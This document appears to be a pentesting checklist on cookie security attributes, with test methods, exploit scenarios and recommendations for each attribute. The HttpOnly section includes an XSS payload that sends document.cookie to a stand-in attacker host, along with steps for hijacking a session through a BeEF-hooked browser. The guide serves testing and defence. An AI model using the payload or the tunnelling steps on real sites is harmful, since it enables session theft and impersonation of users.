# Cookie Security
- - -
## `secure` attribute 
### Test Method
Check if `secure` attribute is present in following cookies
* session token
* anti_CSRF_token
* other cookies contains `sensitive` information 

### Exploit Scenario
* If application `uses` HTTPS then the attacker can't get the session by sniffing network traffic.
* Attacker lure the victim to click any HTTP link of the application or he could sent any arbitrary link that does not exist in the application. Main objective is to initiate a request from victim's browser.
* Browser treats the cookie SOP different than DOM. It checks only domain and path not `protocol` / `scheme`.
* When `secure` flag is not set for any sensitive cookie then browser would agree to pass it via an unencrypted channel such as using HTTP. 
* Attacker can grab / read the cookie value via `network sniffing`.

### Recommendation
Set the `secure` flag.

- - -
## `expire` attribute 
* This attribute is used to set for the persistent cookies.
* This persistent cookie will be used by the browser session and subsequent sessions until the cookie expires. means set date is exceeded. Once the expiration date has exceeded, the browser will delete the cookie

##### Test Method
* Check if the `expire` attribute is set for session / other cookies having sensitive information.
* Check if the life time is set too long (more than a year).

###### Check for cookie authentication replay 
Some vulnerable sites are simply using Cookie as authentication token without further checking on Web server side. 
Check if we can get authenticated and login without username and password rather ONLY providing persistence cookie as an authentication token.

##### Exploit Scenario
If session_token or auth_token that is stored on the user's hard drive then it can be stolen either by  `JavaScript` injection or physical access to that system.  
If the expire date is set too long then the threat potential also gets increased.

##### Recommendation
* Shorten the lifetime for sensitive cookies.
* To authenticate a user don’t solely / primarily depends on persistent cookie (`auth_token`).

- - -
## `httpOnly` attribute 
When `httpOnly` is set for session cookie, `session hijacking` in not possible as that cookie is not accessible from `JavaScript`. 

##### Test Method
Check if 'HttpOnly' attribute is present for sensitive cookie or session token.

##### Exploit scenario
If application is vulnerable to XSS / any script injection attack, then attacker can inject a `JavaScript` that reads those cookies where `HttpOnly` flag not set and sends back to attacker server.

```
<script> new Image().src = http://attacker.site:4444/steal.php?q=+document.cookie; </script>
```

 However, through `BeEF tunnelling proxy`, it is still possible to create `session tunnel` between victim's browser with BeEF panel. 
* Hook the victim's browser in to BeEF through `XSS`
* In BeEF panel, go to the `Rider tab` -> `forge request` feature. Here attacker  should know / guess the authenticated URL / page to initiate the request.

Alternate method -> 
* Right click the hooked browser -> "use as proxy"
* Set up the browser proxy with burp.
  * No Proxy for = 
* Set up Burp with BeEF `burp option` -> set upstream proxy
  * Destination host = *
  * Proxy host = 127.0.0.1
  * Proxy port = 6789 (beef tunnelling proxy)
* Issue GET request for `authenticated` URL / page through `attacker browser`.
* But in the browser if we send the request for google.com the we will get error, as it is cross domain request. In this scenario, BeEF can able to sent the request (simple GET or POST) but can't read the response. 

Limitation -> Burp can't spider the URL

##### Recommendation
Set the `HttpOnly` flag.

> Restricting access to cookies by client-side scripts `does not completely mitigate` the risk of stealing cookies via XSS. However, it does raise the bar considerably and ensures that the most common XSS attack is mitigated, though not completely.

- - -
## `samesite` attribute 
* `SameSite` prevents the browser from sending this cookie along with cross-site requests. 
* The main goal is mitigate the risk of cross-origin information leakage and CSRF attacks (`partial`)

When `samesite=Lax` mode is set then the cookie will be sent along with the GET request initiated by third party website.
* The important point here is that, to send a cookie with a GET request where GET request being made must cause a top level navigation.
* Resources can be loaded by iframe, img tags, and script tags. These requests can also operate as GET requests, but none of them cause TOP LEVEL navigation. Basically, they don't change the URL in the  address bar. Because these GET requests do not cause a TOP LEVEL navigation, thus cookies set to Lax won't be sent with them.

When `samesite=Strict` mode is set then cookie will `not be sent` along with requests initiated by third party websites (GET or POST both)

##### Test Method
* Check if `samesite` attribute is present in the cookie.
* If `samesite=Lax` mode is set then check if the app accepts HTTP method scoping.

##### Exploit Scenario
If app tries to present CSRF by setting the `samesite=Lax` attribute in cookie then an attacker can bypass this by HTTP method scoping -> changing the POST method to GET

##### Recommendation
Use `samesite=Strict` mode.

- - -
## `domain` attribute 
###### Key Points
* Setting a cookie for a subdomain -  `www.erik.io` in a response from parent domain  `erik.io` is `invalid`. 
* But setting a cookie for parent domain  `erik.io` in a response from subdomain  `www.erik.io` is `valid`.

##### Test Method
Check if the `domain` attribute is set explicitly in the cookie.

##### Exploit Scenario
For example if the application resides on server `app.mysite.com` 
* `; domain=.mysite.com` -> most vulnerable solution, cookie can go to sibling-domain - `evil.mysite.com` and subdomain both.
* `; domain=app.mysite.com` -> partial solution, still cookie can go to subdomain  `evil.app.mysite.com` 

Attacker compromises a vulnerable apps resides on
* sub-domain (for example - `evil.app.mysite.com`) or
* sibling-domain (for example - `evil.mysite.com`)

Then he can lure the victim to click any links of those compromised applications.
* When victim accesses  the page, his browser submits all those `domain-misconfigured` cookies to the compromised server.
* Attacker can harvest the valid / active cookies of that vulnerable app from compromised server logs and impersonate as victim.

###### Key Points
If you set a cookie domain without the dot prefix, like `erik.io`, this will still be treated as `erik.io and all sub domains` because finally the `user agent` supplies a `leading dot`. 

However, as per RFC 2109, `setting` a cookie domain to `erik.io` is simply invalid. Hence, you must set it to `.erik.io` for it to be valid. But this dot(.) makes the cookie `visible` to it's sub-domain.

Setting an `explicit` cookie domain may therefore actually `decrease` security, as you will now include all sub domains in all browsers. 

##### Recommendation
* If application `does not set` the domain attribute explicitly then `cookie won't go` to its `sub-domain` because most browser treats domain = `Defaults to the effective request-host` .
* RFC 2109/2965 implementations, if a request is done to `erik.io`, and a cookie is set `without an explicit domain`, the domain defaults to `erik.io` – not to `.erik.io` In that case, it will not match `foo.erik.io`. 
* And the default in most browsers is to only send the cookie when the `domain matches exactly`. However, Internet Explorer violates the RFC, and will send it to all subdomains as well.
* To keep your cookies safe, host your websites with a www-prefix, so www.erik.io instead of erik.io. Therefore no sub-domain could practically exist. (like evil.www.erik.io)

- - -
## `path` attribute 
The `path` attribute signifies the URL or path for which the cookie is valid. The `default` path attribute is set as `/`.

###### Key Points
Before sending a cookie inside a HTTP request, `browser` 
* first matches the `domain` attribute 
* then it will check the `path` attribute.

##### Test Method
* Check if the application is a `blogging` type app and it supports `subfolder` for new user. For example
  * there is a blog site `blog.com`and it allows users to register their blog names. 
  * On successful registration, you can get a subfolder with the registered name `blog.com/attacker`
* Check if the `path` attribute is  set to  `path=/`

###### Key Points  
Now when a cookie is set for `blog.com`, 
* it is valid for its `subdomains`, i.e. `myapp.blog.com` & `attacker.blog.com`, 
* as well as for its `subfolders`, i.e. `blog.com/myapp` & `blog.com/attacker`.

##### Exploit Scenario
* In the above scenario, since the cookie is set for `blog.com`, a cookie assigned to a user logged into `blog.com/myapp` will also be sent with requests for `blog.com/attacker.` 
* The attacker can lure a logged-in user to visit his blog page and steal his cookie from the log.

##### Recommendation
Only for this specific condition, `path` attribute should be set to `path=/myapp/`. 

> The __Secure- and __Host- name prefixes do not have any special meaning to browsers that don't support Cookie Prefixes.

---
## The `__Secure-` prefix
` __Secure-` signals to the browser that
* It should be  set from a URI whose "scheme" is considered "secure" by the user agent and 
* `Secure` attribute is required.
* For example if `https://example.com/` wants to set  SID cookie `__Secure-` prefix 

```
Set-Cookie: __Secure-SID=12345; Domain=example.com -> rejected as "Secure" flag is not set
Set-Cookie: __Secure-SID=12345; Secure; Domain=example.com -> accepted
```

- - -
## The `__Host-` prefix
`__Host-` signals to the browser that 
* It should be  set from a URI whose "scheme" is considered "secure" by the user agent and
* both the `Path=/` and `Secure` attributes are required, and 
* at the same time, that the `Domain` attribute `must not be present`.

* For example if `https://example.com/` wants to set  SID cookie `__Host-` prefix 

```
   Set-Cookie: __Host-SID=12345 -> rejected as no secure and path attribute
   Set-Cookie: __Host-SID=12345; Secure -> rejected as no path attribute 
   Set-Cookie: __Host-SID=12345; Domain=example.com -> rejected as domain attribute is present
   Set-Cookie: __Host-SID=12345; Domain=example.com; Path=/ -> rejected as no secure attribute 
   Set-Cookie: __Host-SID=12345; Secure; Domain=example.com; Path=/ -> rejected as domain attribute is present
```

- - -
## Most secure cookie baking solution
* `__Host-` prefix is set 
* `httpOnly`  is set 
* `samesite=Strict` is set

```
 Set-Cookie: __Host-SID=12345; Secure; Path=/, httpOnly, samesite=Strict
```